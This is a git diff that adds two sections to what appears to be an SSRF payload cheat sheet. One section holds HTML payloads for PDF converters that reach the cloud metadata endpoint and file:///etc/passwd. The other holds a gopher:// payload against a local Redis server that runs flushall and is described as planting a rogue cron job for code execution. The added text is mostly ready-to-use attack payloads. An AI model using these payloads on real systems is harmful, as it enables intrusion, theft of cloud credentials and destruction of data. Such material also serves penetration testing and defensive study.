@@ -114,6 +114,29 @@ Cloud modern environments (AWS) require a token fetched via a PUT request. Stand
 
 ---
 
+## 💣 PDF / HTML Converter SSRF
+**How it works:** Many apps convert HTML strings (from users) to PDF using libraries like `wkhtmltopdf` or `Puppeteer`. If the app doesn't sanitize the HTML, an attacker can embed tags that trigger internal requests.
+
+**Payload:**
+```html
+<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+<img src="http://internal-service/sensitive-data">
+<link rel="attachment" href="file:///etc/passwd">
+```
+
+---
+
+## 💣 Advanced Gopher Smuggling
+**How it works:** The `gopher://` protocol allows sending arbitrary bytes. It's often used to communicate with internal services like Redis or Memcached through SSRF.
+
+**Payload (Redis RCE via crontab):**
+```
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
+```
+*(Constructs a multi-line Redis command set to write a rogue cron job)*
+
+---
+
 ## 💣 Protocol Smuggling via SSRF
 
 ```
